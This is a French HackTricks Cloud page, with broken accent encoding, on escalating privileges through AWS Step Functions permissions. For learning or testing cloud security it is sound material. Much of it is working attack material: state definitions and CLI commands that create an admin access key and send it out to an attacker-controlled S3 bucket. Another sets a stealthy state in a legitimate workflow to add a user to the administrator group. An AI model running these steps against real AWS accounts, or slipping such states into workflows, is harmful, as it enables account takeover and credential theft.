# AWS - √âl√©vation de privil√®ges dans Step Functions

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert Red Team AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## Step Functions

Pour plus d'informations sur ce service AWS, consultez :

{% content-ref url="../aws-services/aws-stepfunctions-enum.md" %}
[aws-stepfunctions-enum.md](../aws-services/aws-stepfunctions-enum.md)
{% endcontent-ref %}

### `states:TestState` & `iam:PassRole`

Un attaquant ayant les autorisations **`states:TestState`** & **`iam:PassRole`** peut tester n'importe quel √©tat et lui attribuer n'importe quel r√¥le IAM sans cr√©er ni mettre √† jour une machine √† √©tats existante, permettant un acc√®s non autoris√© √† d'autres services AWS avec les autorisations des r√¥les. Associ√©es, ces autorisations peuvent entra√Æner des actions non autoris√©es √©tendues, de la manipulation de flux de travail pour alt√©rer des donn√©es √† des violations de donn√©es, √† la manipulation de ressources et √† l'√©l√©vation de privil√®ges.
```bash
aws states test-state --definition <value> --role-arn <value> [--input <value>] [--inspection-level <value>] [--reveal-secrets | --no-reveal-secrets]
```
Les exemples suivants montrent comment tester un √©tat qui cr√©e une cl√© d'acc√®s pour l'utilisateur **`admin`** en exploitant ces autorisations et un r√¥le permissif de l'environnement AWS. Ce r√¥le permissif devrait avoir une politique √† privil√®ges √©lev√©s associ√©e √† lui (par exemple **`arn:aws:iam::aws:policy/AdministratorAccess`**) qui permet √† l'√©tat d'effectuer l'action **`iam:CreateAccessKey`**:

- **stateDefinition.json**:
```json
{
"Type": "Task",
"Parameters": {
"UserName": "admin"
},
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"End": true
}
```
- **Commande** ex√©cut√©e pour effectuer la privesc :
```bash
aws stepfunctions test-state --definition file://stateDefinition.json --role-arn arn:aws:iam::<account-id>:role/PermissiveRole

{
"output": "{
\"AccessKey\":{
\"AccessKeyId\":\"AKIA1A2B3C4D5E6F7G8H\",
\"CreateDate\":\"2024-07-09T16:59:11Z\",
\"SecretAccessKey\":\"1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j\",
\"Status\":\"Active\",
\"UserName\":\"admin\"
}
}",
"status": "SUCCEEDED"
}
```
- **Impact potentiel** : Ex√©cution et manipulation non autoris√©es des flux de travail et acc√®s aux ressources sensibles, pouvant entra√Æner des violations de s√©curit√© importantes.

### `states:CreateStateMachine` & `iam:PassRole` & (`states:StartExecution` | `states:StartSyncExecution`)

Un attaquant avec les autorisations **`states:CreateStateMachine`** & **`iam:PassRole`** serait capable de cr√©er une machine √† √©tats et de lui fournir n'importe quel r√¥le IAM, permettant un acc√®s non autoris√© √† d'autres services AWS avec les autorisations du r√¥le. Contrairement √† la technique de privil√®ge pr√©c√©dente (**`states:TestState`** & **`iam:PassRole`**), celle-ci ne s'ex√©cute pas seule, vous devrez √©galement disposer des autorisations **`states:StartExecution`** ou **`states:StartSyncExecution`** (**`states:StartSyncExecution`** n'est **pas disponible pour les workflows standard**, **uniquement pour les machines √† √©tats express**) pour d√©marrer et ex√©cuter la machine √† √©tats.
```bash
# Create a state machine
aws states create-state-machine --name <value> --definition <value> --role-arn <value> [--type <STANDARD | EXPRESS>] [--logging-configuration <value>]\
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
# Start a state machine execution
aws states start-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
# Start a Synchronous Express state machine execution
aws states start-sync-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
```
Les exemples suivants montrent comment cr√©er une machine d'√©tat qui cr√©e une cl√© d'acc√®s pour l'utilisateur **`admin`** et exfiltre cette cl√© d'acc√®s vers un compartiment S3 contr√¥l√© par un attaquant, en exploitant ces autorisations et un r√¥le permissif de l'environnement AWS. Ce r√¥le permissif devrait avoir une politique √† haut privil√®ge associ√©e (par exemple **`arn:aws:iam::aws:policy/AdministratorAccess`**) qui autorise la machine d'√©tat √† effectuer les actions **`iam:CreateAccessKey`** & **`s3:putObject`**.

- **stateMachineDefinition.json**:
```json
{
"Comment": "Malicious state machine to create IAM access key and upload to S3",
"StartAt": "CreateAccessKey",
"States": {
"CreateAccessKey": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"Parameters": {
"UserName": "admin"
},
"ResultPath": "$.AccessKeyResult",
"Next": "PrepareS3PutObject"
},
"PrepareS3PutObject": {
"Type": "Pass",
"Parameters": {
"Body.$": "$.AccessKeyResult.AccessKey",
"Bucket": "attacker-controlled-S3-bucket",
"Key": "AccessKey.json"
},
"ResultPath": "$.S3PutObjectParams",
"Next": "PutObject"
},
"PutObject": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:s3:putObject",
"Parameters": {
"Body.$": "$.S3PutObjectParams.Body",
"Bucket.$": "$.S3PutObjectParams.Bucket",
"Key.$": "$.S3PutObjectParams.Key"
},
"End": true
}
}
}
```
- **Commande** ex√©cut√©e pour **cr√©er la machine √† √©tats** :
```bash
aws stepfunctions create-state-machine --name MaliciousStateMachine --definition file://stateMachineDefinition.json --role-arn arn:aws:iam::123456789012:role/PermissiveRole
{
"stateMachineArn": "arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine",
"creationDate": "2024-07-09T20:29:35.381000+02:00"
}
```
- **Commande** ex√©cut√©e pour **d√©marrer une ex√©cution** de la machine √† √©tats pr√©c√©demment cr√©√©e :
```json
aws stepfunctions start-execution --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine
{
"executionArn": "arn:aws:states:us-east-1:123456789012:execution:MaliciousStateMachine:1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f",
"startDate": "2024-07-09T20:33:35.466000+02:00"
}
```
{% hint style="warning" %}

Le bucket S3 contr√¥l√© par l'attaquant doit avoir les autorisations pour accepter une action s3:PutObject du compte de la victime.

{% endhint %}

- **Impact potentiel** : Ex√©cution non autoris√©e et manipulation des flux de travail et acc√®s √† des ressources sensibles, pouvant entra√Æner des violations de s√©curit√© importantes.

### `states:UpdateStateMachine` & (pas toujours requis) `iam:PassRole`

Un attaquant avec l'autorisation **`states:UpdateStateMachine`** serait capable de modifier la d√©finition d'une machine √† √©tats, en ajoutant des √©tats furtifs suppl√©mentaires qui pourraient entra√Æner une √©l√©vation de privil√®ges. Ainsi, lorsqu'un utilisateur l√©gitime lance une ex√©cution de la machine √† √©tats, cet nouvel √©tat furtif malveillant sera ex√©cut√© et l'√©l√©vation de privil√®ges r√©ussira.

Selon la permissivit√© du r√¥le IAM associ√© √† la machine √† √©tats, un attaquant se retrouverait dans 2 situations :

1. **R√¥le IAM permissif** : Si le r√¥le IAM associ√© √† la machine √† √©tats est d√©j√† permissif (il a par exemple la politique **`arn:aws:iam::aws:policy/AdministratorAccess`** attach√©e), alors l'autorisation **`iam:PassRole`** ne serait pas n√©cessaire pour escalader les privil√®ges car il ne serait pas n√©cessaire de mettre √† jour √©galement le r√¥le IAM, la d√©finition de la machine √† √©tats suffirait.
2. **R√¥le IAM non permissif** : Contrairement au cas pr√©c√©dent, ici un attaquant aurait √©galement besoin de l'autorisation **`iam:PassRole`** car il serait n√©cessaire d'associer un r√¥le IAM permissif √† la machine √† √©tats en plus de modifier la d√©finition de la machine √† √©tats.
```bash
aws states update-state-machine --state-machine-arn <value> [--definition <value>] [--role-arn <value>] [--logging-configuration <value>] \
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
```
Les exemples suivants montrent comment mettre √† jour une machine √† √©tats l√©gitime qui invoque simplement une fonction Lambda HelloWorld, afin d'ajouter un √©tat suppl√©mentaire qui ajoute l'utilisateur **`unprivilegedUser`** au groupe IAM **`administrateur`**. De cette mani√®re, lorsqu'un utilisateur l√©gitime lance une ex√©cution de la machine √† √©tats mise √† jour, cet nouvel √©tat malveillant furtif sera ex√©cut√© et la mont√©e en privil√®ge sera r√©ussie.

{% hint style="warning" %}

Si la machine √† √©tats n'a pas de r√¥le IAM permissif associ√©, il serait √©galement n√©cessaire d'avoir l'autorisation **`iam:PassRole`** pour mettre √† jour le r√¥le IAM afin d'associer un r√¥le IAM permissif (par exemple, un avec la politique **`arn:aws:iam::aws:policy/AdministratorAccess`** attach√©e).

{% endhint %}

{% tabs %}

{% tab title="Machine √† √©tats l√©gitime" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}

{% tab title="Machine d'√©tat mise √† jour malveillante" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "AddUserToGroup"
},
"AddUserToGroup": {
"Type": "Task",
"Parameters": {
"GroupName": "administrator",
"UserName": "unprivilegedUser"
},
"Resource": "arn:aws:states:::aws-sdk:iam:addUserToGroup",
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}

{% endtabs %}

- **Commande** ex√©cut√©e pour **mettre √† jour** **la machine √† √©tats l√©gitime**:
```bash
aws stepfunctions update-state-machine --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:HelloWorldLambda --definition file://StateMachineUpdate.json
{
"updateDate": "2024-07-10T20:07:10.294000+02:00",
"revisionId": "1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f"
}
```
- **Impact potentiel** : Ex√©cution et manipulation non autoris√©es des flux de travail et acc√®s aux ressources sensibles, pouvant potentiellement entra√Æner des violations de s√©curit√© importantes.

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'√©quipe rouge HackTricks AWS)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
